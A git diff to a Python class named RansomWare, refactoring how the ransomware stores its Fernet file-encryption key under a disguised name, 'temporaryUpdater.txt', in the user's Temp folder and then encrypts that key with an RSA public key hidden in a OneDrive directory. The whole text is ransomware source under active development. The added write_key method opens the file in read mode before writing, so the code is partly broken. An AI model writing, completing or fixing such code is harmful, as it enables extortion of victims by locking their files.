@@ -18,6 +18,7 @@ class RansomWare:
 
     def __init__(self):
         self.key = None
+        self.key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'temporaryUpdater.txt')
         self.crypter = None
         self.public_key = None
         self.sysRoot = os.path.expanduser('~')
@@ -55,26 +56,25 @@ class RansomWare:
         self.key = Fernet.generate_key()
         self.crypter = Fernet(self.key)
 
- 
+    def write_key(self):
+        with open(self.key_path) as f:
+            f.write(self.key)
+            return 1
 
     def encrypt_fernet_key(self):
-        key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'temporaryUpdater.txt')
         public_key = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'OneDrive', 'public.pem')
         created = 0
-        if not os.path.exists(key_path):
-            with open(key_path, 'wb') as f:
-                f.write(self.key)
-                created = 1
-
-        with open(key_path, 'rb') as fk:
+        if not os.path.exists(self.key_path):
+            created = self.write_key()
+        with open(self.key_path, 'rb') as fk:
             fernet_key = fk.read()
         if created == 1:
-            with open(key_path, 'wb') as f:
+            with open(self.key_path, 'wb') as f:
                 self.public_key = RSA.import_key(open(public_key).read())
                 public_crypter = PKCS1_OAEP.new(self.public_key)
                 enc_fernent_key = public_crypter.encrypt(fernet_key)
                 f.write(enc_fernent_key)
-                self.key = enc_fernent_key
+            self.key = enc_fernent_key
         else:
             self.key = fernet_key
         self.crypter = None
